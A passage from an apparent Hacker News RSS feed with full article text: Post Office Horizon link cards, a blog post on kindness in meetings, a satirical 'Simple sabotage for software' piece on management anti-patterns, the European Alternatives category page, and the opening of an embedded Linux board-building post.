<i data-icon="m"></i>Read more on IT for retail and logistics</h4>
<ul>
<li><a id="DigDeeperItem-1" href="https://www.computerweekly.com/news/366588662/IT-witness-hidden-away-from-Post-Office-court-battle-supported-it-from-shadows">
<img data-src="https://cdn.ttgtmedia.com/visuals/ComputerWeekly/HeroImages/evidence-files-data-Zerbor-adobe_searchsitetablet_520X173.jpg" data-srcset="https://cdn.ttgtmedia.com/visuals/ComputerWeekly/HeroImages/evidence-files-data-Zerbor-adobe_searchsitetablet_520X173.jpg 960w,https://cdn.ttgtmedia.com/visuals/ComputerWeekly/HeroImages/evidence-files-data-Zerbor-adobe.jpg 1280w" alt="" src="https://cdn.ttgtmedia.com/visuals/ComputerWeekly/HeroImages/evidence-files-data-Zerbor-adobe_searchsitetablet_520X173.jpg" srcset="https://cdn.ttgtmedia.com/visuals/ComputerWeekly/HeroImages/evidence-files-data-Zerbor-adobe_searchsitetablet_520X173.jpg 960w,https://cdn.ttgtmedia.com/visuals/ComputerWeekly/HeroImages/evidence-files-data-Zerbor-adobe.jpg 1280w">
<h5>IT witness was hidden away from Post Office court battle, but supported it from shadows</h5>
<div>
<p><img src="https://cdn.ttgtmedia.com/rms/computerweekly/Karl-Flinders-profile-pic-2022-140x180px.jpg" alt="KarlFlinders">
</p>
<p><span>By: <span>Karl&nbsp;Flinders</span></span>
</p></div>
</a></li>
<li><a id="DigDeeperItem-2" href="https://www.computerweekly.com/news/366588592/Post-Office-Capture-software-training-deficit-echoes-systemic-Horizon-problems">
<img data-src="https://cdn.ttgtmedia.com/visuals/ComputerWeekly/HeroImages/Capture-floppy-disks-Karl-Flinders-hero-2_searchsitetablet_520X173.jpg" data-srcset="https://cdn.ttgtmedia.com/visuals/ComputerWeekly/HeroImages/Capture-floppy-disks-Karl-Flinders-hero-2_searchsitetablet_520X173.jpg 960w,https://cdn.ttgtmedia.com/visuals/ComputerWeekly/HeroImages/Capture-floppy-disks-Karl-Flinders-hero-2.jpg 1280w" alt="" src="https://cdn.ttgtmedia.com/visuals/ComputerWeekly/HeroImages/Capture-floppy-disks-Karl-Flinders-hero-2_searchsitetablet_520X173.jpg" srcset="https://cdn.ttgtmedia.com/visuals/ComputerWeekly/HeroImages/Capture-floppy-disks-Karl-Flinders-hero-2_searchsitetablet_520X173.jpg 960w,https://cdn.ttgtmedia.com/visuals/ComputerWeekly/HeroImages/Capture-floppy-disks-Karl-Flinders-hero-2.jpg 1280w">
<h5>Post Office Capture software training deficit echoes systemic Horizon problems</h5>
<div>
<p><img src="https://cdn.ttgtmedia.com/rms/computerweekly/Karl-Flinders-profile-pic-2022-140x180px.jpg" alt="KarlFlinders">
</p>
<p><span>By: <span>Karl&nbsp;Flinders</span></span>
</p></div>
</a></li>
<li><a id="DigDeeperItem-3" href="https://www.computerweekly.com/news/366587935/Fujitsu-had-Post-Office-over-a-barrel-inquiry-told">
<img data-src="https://cdn.ttgtmedia.com/visuals/ComputerWeekly/HeroImages/Fujitsu-building-Germany-Editorial-Use-Only-dvoevnore-adobe_searchsitetablet_520X173.jpg" data-srcset="https://cdn.ttgtmedia.com/visuals/ComputerWeekly/HeroImages/Fujitsu-building-Germany-Editorial-Use-Only-dvoevnore-adobe_searchsitetablet_520X173.jpg 960w,https://cdn.ttgtmedia.com/visuals/ComputerWeekly/HeroImages/Fujitsu-building-Germany-Editorial-Use-Only-dvoevnore-adobe.jpg 1280w" alt="" src="https://cdn.ttgtmedia.com/visuals/ComputerWeekly/HeroImages/Fujitsu-building-Germany-Editorial-Use-Only-dvoevnore-adobe_searchsitetablet_520X173.jpg" srcset="https://cdn.ttgtmedia.com/visuals/ComputerWeekly/HeroImages/Fujitsu-building-Germany-Editorial-Use-Only-dvoevnore-adobe_searchsitetablet_520X173.jpg 960w,https://cdn.ttgtmedia.com/visuals/ComputerWeekly/HeroImages/Fujitsu-building-Germany-Editorial-Use-Only-dvoevnore-adobe.jpg 1280w">
<h5>Fujitsu had Post Office ‘over a barrel’, inquiry told</h5>
<div>
<p><img src="https://cdn.ttgtmedia.com/rms/computerweekly/Karl-Flinders-profile-pic-2022-140x180px.jpg" alt="KarlFlinders">
</p>
<p><span>By: <span>Karl&nbsp;Flinders</span></span>
</p></div>
</a></li>
<li><a id="DigDeeperItem-4" href="https://www.computerweekly.com/news/366587837/Mystery-Post-Office-software-developer-revealed-in-1995-Horizon-project-document">
<img data-src="https://cdn.ttgtmedia.com/visuals/ComputerWeekly/HeroImages/Capture-floppy-disks-Karl-Flinders-hero-1_searchsitetablet_520X173.jpg" data-srcset="https://cdn.ttgtmedia.com/visuals/ComputerWeekly/HeroImages/Capture-floppy-disks-Karl-Flinders-hero-1_searchsitetablet_520X173.jpg 960w,https://cdn.ttgtmedia.com/visuals/ComputerWeekly/HeroImages/Capture-floppy-disks-Karl-Flinders-hero-1.jpg 1280w" alt="" src="https://cdn.ttgtmedia.com/visuals/ComputerWeekly/HeroImages/Capture-floppy-disks-Karl-Flinders-hero-1_searchsitetablet_520X173.jpg" srcset="https://cdn.ttgtmedia.com/visuals/ComputerWeekly/HeroImages/Capture-floppy-disks-Karl-Flinders-hero-1_searchsitetablet_520X173.jpg 960w,https://cdn.ttgtmedia.com/visuals/ComputerWeekly/HeroImages/Capture-floppy-disks-Karl-Flinders-hero-1.jpg 1280w">
<h5>Mystery Post Office software developer revealed in 1995 Horizon project document</h5>
<div>
<p><img src="https://cdn.ttgtmedia.com/rms/computerweekly/Karl-Flinders-profile-pic-2022-140x180px.jpg" alt="KarlFlinders">
</p>
<p><span>By: <span>Karl&nbsp;Flinders</span></span>
</p></div>
</a></li>
</ul>
</section>


</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Do not try to be the smartest in the room; try to be the kindest (369 pts)]]></title>
            <link>https://www.jorgegalindo.me/en/blog/posts/do-not-be-the-smartest-in-the-room-try-to-be-the-kindest</link>
            <guid>40695997</guid>
            <pubDate>Sun, 16 Jun 2024 10:27:23 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.jorgegalindo.me/en/blog/posts/do-not-be-the-smartest-in-the-room-try-to-be-the-kindest">https://www.jorgegalindo.me/en/blog/posts/do-not-be-the-smartest-in-the-room-try-to-be-the-kindest</a>, See on <a href="https://news.ycombinator.com/item?id=40695997">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="w-node-_5d141bd4-70dc-c230-96ee-97ce8d5b683a-a9ef052d"><p><img src="https://cdn.prod.website-files.com/65ff3881d9c8b3b51490c6bf/665eee53d6e16530d6d08e17_0_2.jpg" loading="lazy" alt="Do not try to be the smartest in the room; try to be the kindest."></p><div id="w-node-_33abfe72-f831-f4c0-40a3-a8f9a0405399-a9ef052d"><p>I always considered myself not especially smart. I mean, I think I have an "eye" or a "nose" for detecting good and bad things in advance, but I developed so many different things during my career that I am not an expert in anything in particular. In Spanish, we have a saying, "Maestro Liendre: De tó sabe, pero de ná entiende." I don't really know (and don't want) to translate it because it loses its punch, but it fits perfectly here.</p><p>Maybe that's why I had that saying in mind before every single meeting I had over the past few years.<strong><em> "Do not try to be the smartest in the room; try to be the kindest."</em></strong></p><blockquote>What does that mean? Well, the main point is always being willing to help.</blockquote><p>This might seem like obvious advice, but in the business world of winning and losing, that many people still use "war" concepts to refer to meetings and negotiations. This soft skill is a game changer.</p><p>Here's what I expect from someone <em>kind</em> in a meeting, we cold call it "The kind Framework" or "El Framework Güenagent":</p><ul role="list"><li><strong>Listening</strong>. This is very important and pretty difficult to find in meetings. Many people arrive with a speech in their heads and are just waiting for their turn to spit out the words without any link or context to others' points of view.</li><li><strong>Being respectful</strong>. Being nice is the new punk, and respect and understanding of other realities are the Rosetta Stone. We should not only try to be respectful but also demand this from others.</li><li><strong>Being empathetic</strong>. This is closely linked to listening. You need to understand the background of the topics or issues people bring to the table and put yourself in their shoes.</li><li><strong>Being resolutive</strong>. A meeting that doesn't end with a solution on the table is just a waste of time for everyone involved. Applying points 1, 2, and 3 in a killer combo can lead to a solution you probably didn't have in mind at the very beginning.</li></ul><p>For me, this is by default. And honestly, it's more common to find "nice" people than those with other, less pleasant traits. And guess what? Niceness is contagious. When you apply these aptitudes, you can expect the same from others, spreading the nice framework across teams.</p><p>So, this is my particular way of being nice in meetings, and I can tell you something: </p><blockquote>just a few people are going to miss the smartest in the room, but everyone is going to miss someone kind.</blockquote><p>‍</p></div><div id="w-node-_977870d7-14c7-5fa2-7568-051a69247d26-a9ef052d"><p>This article is tagged with:</p></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Simple sabotage for software (2023) (213 pts)]]></title>
            <link>https://erikbern.com/2023/12/13/simple-sabotage-for-software.html</link>
            <guid>40695839</guid>
            <pubDate>Sun, 16 Jun 2024 09:39:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://erikbern.com/2023/12/13/simple-sabotage-for-software.html">https://erikbern.com/2023/12/13/simple-sabotage-for-software.html</a>, See on <a href="https://news.ycombinator.com/item?id=40695839">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
  
  <time datetime="2023-12-13T00:00:00Z">2023-12-13</time>
  <p>CIA produced a fantastic book during the peak of World War 2 called <a href="https://www.cia.gov/static/5c875f3ec660e092cf893f60b4a288df/SimpleSabotage.pdf">Simple Sabotage</a>. It laid out various ways for infiltrators to ruin productivity of a company. Some of the advice is timeless, for instance the section about “General interference with Organizations and Production”:</p>
<ol>
<li>Insist on doing everything through “channels”. Never permit short-cuts to be taken in order to expedite decisions.</li>
<li>Make “speeches”. Talk as frequently as possible and at lengths. Illustrate your “points” by long anecdotes and accounts of personal experience. Never hesitate to make a few “patriotic” comments.</li>
<li>When possible, refer all matters to committees for “further study and consideration”. Attempt to make committees as large as possible — never less than five.</li>
<li>Bring up irrelevant issues as frequently as possible.</li>
<li>Haggle over precise wordings of communications, minutes, resolutions.</li>
<li>Refer back to matters decided upon at the last meeting and attempt to re-open the question of the advisability of that decision.</li>
<li>Advicate “caution”. Be “reasonable” and urge your fellow conferees to be “reasonable” and avoid haste which might result in embarrassments or difficulties later on.</li>
<li>Be worried about the propriety of any decision — raise the question of whether such action as is contemplated lies within the jurisdiction of the group or whether it might conflict with the policy of some higher echelon.</li>
</ol>
<p>I guess I've always been fascinated with how well this has stood the test of time? I even got this particular section framed and hung up at our office:</p>
<p><img src="https://erikbern.com/assets/simple_sabotage.jpeg" alt="simple sabotage"></p>
<h2 id="your-mission">Your mission</h2>
<p>Let's say you were employed as a CTO behind the front lines and you wanted to destroy productivity for as long as you can without getting caught. You can of course make a series of <em>obviously</em> bad decisions, but you'd get fired quickly. The real goal here is to sap the company of its productivity slowly, while maintaining a façade of plausibility and normalcy. What are some things you can do?</p>
<h2 id="technology">Technology</h2>
<ul>
<li>When joining, require a 6-18 months rewrite of core systems. Blame the previous CTO.</li>
<li>Encourage everyone use their own language and frameworks.</li>
<li>Split systems along arbitrary boundaries: maximize the number of systems involved in any feature.</li>
<li>Encourage a complex dev setup: running a service mesh with a dozen services at a minimum.</li>
<li>Make sure production environment differs from developer environments in as many ways as possible.</li>
<li>Deploy as infrequently as possible. Urge extreme caution about deployments. Leverage any production issue as a reason to “pull the brakes”.</li>
<li>Introduce very complex processes for code change and common workflows. Blame it on “security” or “compliance”.</li>
<li>Make sure every task is tracked in a task tracker and has been reviewed, prioritized, and signed off by a group of at least five people.</li>
<li>Disallow anything outside the scope of the original task, such as code cleanup or other drive-by improvements.</li>
<li>Build in-house versions of almost anything that's <em>not</em> a core competency. Justify it by “avoiding vendor lock-in”.</li>
<li>Insist on adding abstraction layers on top of everything. Use vendors that are themselves abstractions and then add extra layers of abstractions.</li>
<li>Encourage technical decisions based on wildly optimistic expectations of scale. Plan for at least 3 orders of magnitude more load than you have.</li>
<li>Encourage communal ownership of systems. Make sure no one feels responsible for maintenance.</li>
<li>Insist on centralizing almost everything as a “platform” owned by the “platform team”. Understaff the platform team and prevent other teams from building anythings that the platform might “own”.</li>
<li>Make the platform team iterate on APIs frequently and mandate that other teams refactor their code to the latest version as frequently as possible.</li>
<li>Hire “architects” and require even small changes to have an “architecture review”.</li>
<li>Require even small changes to have a “security review”.</li>
</ul>
<h2 id="product">Product</h2>
<ul>
<li>Dismiss useful metrics on academic grounds (e.g. “biased” or “lagging indicator”).</li>
<li>Pick vanity metrics with little or no correlation with business value and high amount of noise.</li>
<li>Insist on anything to be done as a “big bet” and insist on everything to be completely done before deployed.</li>
<li>Consider every feature a “must-have” and critical part of “version zero”. Do not budge.</li>
<li>Develop incredibly detailed “strategic” plans.</li>
<li>Pivot frequently.</li>
<li>Dismiss obvious improvements as “local optimization”.</li>
<li>Use latest trends to tie up resources. Kickstart a vacuous “AI strategy” that seems plausible at the surface. Spend heavily on vendors and consultants for these.</li>
<li>Encourage product managers to spend most of their time on “strategy” and “planning”.</li>
<li>Make it hard/impossible for engineers and product manager to use the product internally.</li>
<li>Dismiss users as “stupid” internally.</li>
</ul>
<h2 id="leadership">Leadership</h2>
<ul>
<li>Link compensation to title, and title to to team size, in order to incentivize bloat.</li>
<li>Make big talk about strategies, features, or technical complexity.</li>
<li>Make expensive acquisitions to enter new product areas. Refer to “synergies”. Shut down the acquired product.</li>
<li>Use lots of dotted lines in the reporting structure.</li>
<li>As much as possible, have people to report into managers in other teams, locations, or functions. Make sure managers are ill-equipped to supervise their reports.</li>
<li>Frequently reassign underperformers to other teams.</li>
<li>Put high performers on highly speculative R&amp;D projects with unclear deliverables.</li>
<li>Always require a meeting for any decision, no matter how trivial.</li>
<li>Insist that every “stakeholder” needs to be present in the meeting.</li>
</ul>
<h2 id="hiring">Hiring</h2>
<ul>
<li>Create a hiring process that seems plausibly objective but in reality subjective.</li>
<li>Reject the best people based on “poor culture fit” or other vague criteria.</li>
<li>Hire the weakest candidates based on “potential” or “attitude” or other vague criteria.</li>
<li>Recruit very expensive senior leaders with large headcount promises.</li>
<li>Use inflated titles and made-up roles to attract opportunists.</li>
<li>Hire highly specialized “experts”, then create contrived projects to prevent them from quitting.</li>
<li>Use specialization as a justification to hire other, complementary people.</li>
</ul>
<h2 id="project-management">Project management</h2>
<ul>
<li>Require very detailed estimates for any project.</li>
<li>Encourage projects that span as many teams as possible, ideally in different locations.</li>
<li>Add new requirements that depend on work done by other teams.</li>
<li>Frequently make use of expensive agencies. Make the scope ambigious and hand over unfinished prototypes on the in-house team for them to finish.</li>
<li>Build complex “self-service” systems for stakeholders in other teams.</li>
</ul>
<figure>
  <img src="https://erikbern.com/assets/sabotage.jpeg" alt="my alt text">
  <figcaption><small><em>This is from the 1994 music video <a href="https://www.youtube.com/watch?v=z5rRZdiu1UE">Sabotage</a> by Beastie Boys. The lyrics are mostly about technology leadership and developer productivity.</em></small></figcaption>
</figure>
<h2 id="the-outcome">The outcome</h2>
<p>It's a hard job to pull it off! But if you can parachute behind the enemy front lines, and land a job as a CTO, you can make this happen.</p>
<p>For the non-saboteur: this is obviously a story about how to get the most out of your team. Productivity in general is a story of a thousand cuts, and none of these things are in themselves the thing that will ruin the productivity. But productivity adds up on a logarithmic scale, meaning that all these things compound in a multiplicative way. Basically, do 100 things that each is a 5% tax on productivity, and you just slowed everything down by 131x! The only way to keep engineers happy is to say no to 100 minor cuts that each sound plausible and <a href="https://www.youtube.com/watch?v=6XsOO8j8NK0">specious</a>.</p>


  
<strong>

    Tagged with: 
    <a href="https://erikbern.com/tags/management">management</a>, <a href="https://erikbern.com/tags/software">software</a>
</strong>

</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[European Alternatives (183 pts)]]></title>
            <link>https://european-alternatives.eu</link>
            <guid>40695754</guid>
            <pubDate>Sun, 16 Jun 2024 09:17:56 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://european-alternatives.eu">https://european-alternatives.eu</a>, See on <a href="https://news.ycombinator.com/item?id=40695754">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    

        <div>
            <p>
                <hgroup>
                    <h2>
                        European alternatives for digital products
                    </h2>
                    <h2>
                        We help you find European alternatives for digital service and products, like cloud services and SaaS products.
                    </h2>
                </hgroup>
            </p>

            <div>
                <dl>
                    <div>
                        <dt>
                            
                            <p>Support local businesses</p>
                        </dt>
                        <dd>
                            When you buy from local businesses, you are supporting yourself down the road. Taxes paid by the company come back to you indirectly and the company creates jobs in your region.
                        </dd>
                    </div>

                    <div>
                        <dt>
                            
                            <p>Data protection / GDPR</p>
                        </dt>
                        <dd>
                            Some companies outside Europe tend to ignore data protection and related laws such as the GDPR or do not implement them correctly.
                        </dd>
                    </div>

                    <div>
                        <dt>
                            
                            <p>VAT / Billing</p>
                        </dt>
                        <dd>
                            As a business that operates in Europe, it is possible to get a VAT refund for products/services of other European companies. European companies also tend to offer payment methods that are commonly used in Europe.
                        </dd>
                    </div>

                    <div>
                        <dt>
                            
                            <p>Similar legal requirements</p>
                        </dt>
                        <dd>
                            Within the EU, many laws and framework conditions are set by the EU, which helps to cover a large market without having to consider large country-specific differences. It is also easier to enforce your rights against another company located in the EU.
                        </dd>
                    </div>
                </dl>
            </div>
        </div>

    <section>
        <div>
                
                <p>
                    <h2>
                        Categories
                    </h2>
                </p>
            </div>

        <div>

            <ul role="list">
                                    <li>
    <a href="https://european-alternatives.eu/category/web-analytics-services">
        <div>
                            <p><img width="84" height="84" src="https://cdn.european-alternatives.eu/categoryLogo/4e29da95-e5a9-445b-950b-46a75064896b/chart-bar.svg" alt="web analytics services logo"></p><div>
                <p>
                    <h3>Web analytics services</h3>
                </p>
                <p>A web analytics service tracks user behavior on websites so that website owners can understand user usage and optimize their websites.</p>
            </div>
        </div>
        <div>
                <p><span>
                        31 alternatives
                    </span>
                </p>
            </div>
    </a>
</li>
                                    <li>
    <a href="https://european-alternatives.eu/category/cloud-computing-platforms">
        <div>
                            <p><img width="84" height="84" src="https://cdn.european-alternatives.eu/categoryLogo/a161ee4f-395e-4ad2-8bae-df8e9ea71e70/cloud.svg" alt="cloud computing platforms logo"></p><div>
                <p>
                    <h3>Cloud computing platforms</h3>
                </p>
                <p>A cloud computing platform provides on-demand hosting services.</p>
            </div>
        </div>
        <div>
                <p><span>
                        12 alternatives
                    </span>
                </p>
            </div>
    </a>
</li>
                                    <li>
    <a href="https://european-alternatives.eu/category/cdn-content-delivery-network">
        <div>
                            <p><img width="84" height="84" src="https://cdn.european-alternatives.eu/categoryLogo/e0f28f2b-f025-49a0-a9e3-b41baa76322f/globe.svg" alt="content delivery network (CDN) services logo"></p><div>
                <p>
                    <h3>Content delivery network (CDN) services</h3>
                </p>
                <p>A content delivery network (CDN) is a geographically distributed network.</p>
            </div>
        </div>
        <div>
                <p><span>
                        7 alternatives
                    </span>
                </p>
            </div>
    </a>
</li>
                                    <li>
    <a href="https://european-alternatives.eu/category/email-providers">
        <div>
                            <p><img width="84" height="84" src="https://cdn.european-alternatives.eu/categoryLogo/52675d0f-53e0-4a5c-ab45-592df8eaffb3/mail.svg" alt="email providers logo"></p><div>
                <p>
                    <h3>Email providers</h3>
                </p>
                <p>An email provider provides its users with an e-mail address and the corresponding mailboxes.</p>
            </div>
        </div>
        <div>
                <p><span>
                        20 alternatives
                    </span>
                </p>
            </div>
    </a>
</li>
                                    <li>
    <a href="https://european-alternatives.eu/category/vps-virtual-private-server-hosters">
        <div>
                            <p><img width="84" height="84" src="https://cdn.european-alternatives.eu/categoryLogo/3db9ad09-6350-4d4d-81e4-971f62250c60/server.svg" alt="virtual private server (VPS) hosters logo"></p><div>
                <p>
                    <h3>Virtual private server (VPS) hosters</h3>
                </p>
                <p>A virtual private server (VPS) hoster provides virtual servers with predefined RAM, storage, traffic and virtual cores.</p>
            </div>
        </div>
        <div>
                <p><span>
                        23 alternatives
                    </span>
                </p>
            </div>
    </a>
</li>
                                    <li>
    <a href="https://european-alternatives.eu/category/search-engines">
        <div>
                            <p><img width="84" height="84" src="https://cdn.european-alternatives.eu/categoryLogo/f0e5e0c5-8b48-421a-b9bf-aa2da29a080b/search.svg" alt="search engines logo"></p><div>
                <p>
                    <h3>Search engines</h3>
                </p>
                <p>A search engine allows their users to search the internet.</p>
            </div>
        </div>
        <div>
                <p><span>
                        6 alternatives
                    </span>
                </p>
            </div>
    </a>
</li>
                                    <li>
    <a href="https://european-alternatives.eu/category/transactional-email-service">
        <div>
                            <p><img width="84" height="84" src="https://cdn.european-alternatives.eu/categoryLogo/31ae64ff-e583-4572-be41-be4946c12195/mail.svg" alt="transactional email service logo"></p><div>
                <p>
                    <h3>Transactional email service</h3>
                </p>
                <p>A transactional mail service offers users the ability to send emails from their applications via the service.</p>
            </div>
        </div>
        <div>
                <p><span>
                        5 alternatives
                    </span>
                </p>
            </div>
    </a>
</li>
                                    <li>
    <a href="https://european-alternatives.eu/category/domain-name-registrar">
        <div>
                            <p><img width="84" height="84" src="https://cdn.european-alternatives.eu/categoryLogo/42ccd704-ce5f-4070-8e3e-48c581199b42/globe.svg" alt="domain name registrars logo"></p><div>
                <p>
                    <h3>Domain name registrars</h3>
                </p>
                <p>Domain name registrars are companies that manages the reservation of Internet domain names.</p>
            </div>
        </div>
        <div>
                <p><span>
                        12 alternatives
                    </span>
                </p>
            </div>
    </a>
</li>
                                    <li>
    <a href="https://european-alternatives.eu/category/navigation-apps">
        <div>
                            <p><img width="84" height="84" src="https://cdn.european-alternatives.eu/categoryLogo/8aa6cb84-a814-4d75-9a3f-23e13cd4d4bc/location-marker.svg" alt="navigation apps logo"></p><div>
                <p>
                    <h3>Navigation apps</h3>
                </p>
                <p>Navigation apps help you get from A to B.</p>
            </div>
        </div>
        <div>
                <p><span>
                        9 alternatives
                    </span>
                </p>
            </div>
    </a>
</li>
                                    <li>
    <a href="https://european-alternatives.eu/category/microblogging-services">
        <div>
                            <p><img width="84" height="84" src="https://cdn.european-alternatives.eu/categoryLogo/83a8bcfd-38fb-42ea-ba77-1940108b7026/user-group.svg" alt="microblogging services logo"></p><div>
                <p>
                    <h3>Microblogging services</h3>
                </p>
                <p>A microblogging service allows users to post short texts, images or links to videos.</p>
            </div>
        </div>
        <div>
                <p><span>
                        2 alternatives
                    </span>
                </p>
            </div>
    </a>
</li>
                                    <li>
    <a href="https://european-alternatives.eu/category/uptime-monitoring-services">
        <div>
                            <p><img width="84" height="84" src="https://cdn.european-alternatives.eu/categoryLogo/4215d2c2-9841-459c-b62e-81c5b426166b/check-circle.svg" alt="uptime monitoring services logo"></p><div>
                <p>
                    <h3>Uptime monitoring services</h3>
                </p>
                <p>An uptime monitoring service periodically checks if a website or other service is active.</p>
            </div>
        </div>
        <div>
                <p><span>
                        8 alternatives
                    </span>
                </p>
            </div>
    </a>
</li>
                                    <li>
    <a href="https://european-alternatives.eu/category/file-hosting-services">
        <div>
                            <p><img width="84" height="84" src="https://cdn.european-alternatives.eu/categoryLogo/379f2b3e-c489-4721-9469-0f5a3d239943/paper-clip.svg" alt="file hosting services logo"></p><div>
                <p>
                    <h3>File hosting services</h3>
                </p>
                <p>With a file hosting service, users can upload files to back them up or share them with others.</p>
            </div>
        </div>
        <div>
                <p><span>
                        9 alternatives
                    </span>
                </p>
            </div>
    </a>
</li>
                                    <li>
    <a href="https://european-alternatives.eu/category/machine-translation-services">
        <div>
                            <p><img width="84" height="84" src="https://cdn.european-alternatives.eu/categoryLogo/c96ad29f-0fe2-4362-a7ea-94a719fc7024/translate.svg" alt="machine translation services logo"></p><div>
                <p>
                    <h3>Machine translation services</h3>
                </p>
                <p>A machine translation service (translator) is a service that programmatically translates text from one language to another.</p>
            </div>
        </div>
        <div>
                <p><span>
                        5 alternatives
                    </span>
                </p>
            </div>
    </a>
</li>
                                    <li>
    <a href="https://european-alternatives.eu/category/professional-networking-platforms">
        <div>
                            <p><img width="84" height="84" src="https://cdn.european-alternatives.eu/categoryLogo/32579de8-77f6-41e5-828d-20b2f823a8c8/briefcase.svg" alt="professional networking platforms logo"></p><div>
                <p>
                    <h3>Professional networking platforms</h3>
                </p>
                <p>A professional networking platform is a social network focused on business relationships.</p>
            </div>
        </div>
        <div>
                <p><span>
                        1 alternatives
                    </span>
                </p>
            </div>
    </a>
</li>
                                    <li>
    <a href="https://european-alternatives.eu/category/object-storage-providers">
        <div>
                            <p><img width="84" height="84" src="https://cdn.european-alternatives.eu/categoryLogo/79b8ce24-ca1f-4593-ab74-c0300ccc5a5b/database.svg" alt="object storage providers logo"></p><div>
                <p>
                    <h3>Object storage providers</h3>
                </p>
                <p>Object storage providers allow their users to store files hierarchically.</p>
            </div>
        </div>
        <div>
                <p><span>
                        10 alternatives
                    </span>
                </p>
            </div>
    </a>
</li>
                            </ul>
            <div>
                <p><a href="https://european-alternatives.eu/categories">
                    See all
                </a>
            </p></div>

        </div>
    </section>



    

    <div>
        
        <h2>
            Any suggestions?
        </h2>
        <p>
            Use the chat in the right bottom corner
        </p>
    </div>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Making my first embedded Linux system (130 pts)]]></title>
            <link>https://popovicu.com/posts/making-my-first-embedded-linux-system/</link>
            <guid>40695165</guid>
            <pubDate>Sun, 16 Jun 2024 06:51:25 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://popovicu.com/posts/making-my-first-embedded-linux-system/">https://popovicu.com/posts/making-my-first-embedded-linux-system/</a>, See on <a href="https://news.ycombinator.com/item?id=40695165">Hacker News</a></p>
<div id="readability-page-1" class="page"><article id="article" role="article">
      <p><a href="https://twitter.com/popovicu94?ref_src=twsrc%5Etfw" data-show-count="false">Follow @popovicu94</a></p>
<p>This post is the documentation of my journey to building <a href="https://popovicu.com/linux-board">my first Linux system</a>. I started with no PCB experience whatsoever and I am here to document the journey to my Linux-ready PCB.</p>
<p>The initial part of this text may seem somewhat off-topic, but I promise there is cohesion to all these sections, so please patiently read through the whole text.</p>
<h2 id="table-of-contents">Table of contents</h2>
<details><summary>Open Table of contents</summary>
<ul>
<li>
<p><a href="#dont-be-scared">Don’t be scared!</a></p>
</li>
<li>
<p><a href="#pre-reading">Pre-reading</a></p>
</li>
<li>
<p><a href="#off-the-shelf-pcbs-and-hiding-the-details">Off-the-shelf PCBs and hiding the details</a></p>
</li>
<li>
<p><a href="#very-first-custom-pcb-board-not-linux-ready">Very first custom PCB board (not Linux-ready)</a></p>
<ul>
<li><a href="#booting-a-chip">Booting a chip</a></li>
<li><a href="#usage-of-programmers-ie-enter-the-dragon">Usage of programmers (i.e. “enter the dragon”)</a></li>
<li><a href="#the-dudes-who-program-avrdude">The dudes who program: <code>avrdude</code></a></li>
<li><a href="#what-is-a-dragon-and-do-i-need-it">What is a Dragon, and do I need it?</a></li>
<li><a href="#designing-a-pcb-for-attiny">Designing a PCB for ATtiny</a></li>
</ul>
</li>
<li>
<p><a href="#what-goes-into-designing-an-embedded-linux-system">What goes into designing an embedded Linux system?</a></p>
</li>
<li>
<p><a href="#inspirational-design">Inspirational design</a></p>
</li>
<li>
<p><a href="#designing-the-schematic">Designing the schematic</a></p>
<ul>
<li>
<p><a href="#power-supply">Power supply</a></p>
</li>
<li>
<p><a href="#crystal">Crystal</a></p>
</li>
<li>
<p><a href="#decoupling-capacitors">Decoupling capacitors</a></p>
</li>
<li>
<p><a href="#connectors-pins-and-io">Connectors, pins and IO</a></p>
<ul>
<li><a href="#fel-mode-button">“FEL mode” button</a></li>
</ul>
</li>
<li>
<p><a href="#spi-flash">SPI flash</a></p>
</li>
<li>
<p><a href="#svref-weirdness"><code>SVREF</code> weirdness</a></p>
</li>
<li>
<p><a href="#concrete-components">Concrete components</a></p>
</li>
<li>
<p><a href="#putting-the-schematic-together">Putting the schematic together</a></p>
</li>
</ul>
</li>
<li>
<p><a href="#routing-the-pcb">Routing the PCB</a></p>
</li>
<li>
<p><a href="#creating-the-software-image">Creating the software image</a></p>
</li>
<li>
<p><a href="#conclusion">Conclusion</a></p>
</li>
</ul>
</details>
<h2 id="dont-be-scared">Don’t be scared!</h2>
<p>While I’m not claiming that my design is something that should immediately go into production and be used to manage the treatment of hospital patients, I do think my prototype at least boots and runs Linux and if you’re reading this article, that’s probably your only goal to start with. Once you go through this initial hurdle, you’ll have a much better idea of where to go next to indeed get to that production readiness.</p>
<p>I’m sure as someone who is not a PCB expert I made a ton of rookie mistakes in my design for the <a href="https://popovicu.com/linux-board">Linux board</a>, but it got the job done — and it was easier than I thought it would be. If you know some basics of electrical engineering, and you’re disciplined and can spare a few hours a day, I think you may be a single-digit number of days away from putting together a similar prototype that can boot Linux. I hope that’s encouraging and I hope this text makes you cross that journey much faster.</p>
<h2 id="pre-reading">Pre-reading</h2>
<p>If <code>V = IR</code> means nothing to you, probably you should take a step back and review the absolute basics of electric circuits. You should have some intuition around words like resistors, capacitors, and inductors before you proceed. That said, the rest of this text should be easy to follow with only the absolute basics in electronics (not that I know much more anyway).</p>
<h2 id="off-the-shelf-pcbs-and-hiding-the-details">Off-the-shelf PCBs and hiding the details</h2>
<p>PCBs like Raspberry Pi are nice and popular, but if we just keep using them, especially by following the manufacturers’ basic tutorials, we probably don’t get much idea about how things work; and we need that knowledge to make our PCBs. My observation is that this is in particular true with microcontrollers, so we’ll use that as an example.</p>
<p>First, let’s see what’s different with Linux, though. For example, if you use Raspberry Pi to boot Linux, or any other board, at some point, you will reach an area of familiar environment. No matter whether you’re on a full-blown desktop Linux or some tiny RPi image, you still see things like <code>/dev</code> and often run familiar commands like <code>ls</code> and so on. The reason for this is the stability of the API (ABI?) of the Linux system. Standardization like this doesn’t exist with the microcontrollers.</p>
<p>When you load a sample code into an Arduino board, you may be going through a completely different journey compared to an STM32 Nucleo board. Not only is the process of loading the code different, but the methodology for writing the code itself can vary wildly. We see different IDEs and flows to do the same thing: write some C code to flicker LEDs. Sadly, the manufacturers indeed often corner us into using their customized flows (presumably to increase the vendor lock-in; consciously or otherwise, use your judgment and skepticism).</p>
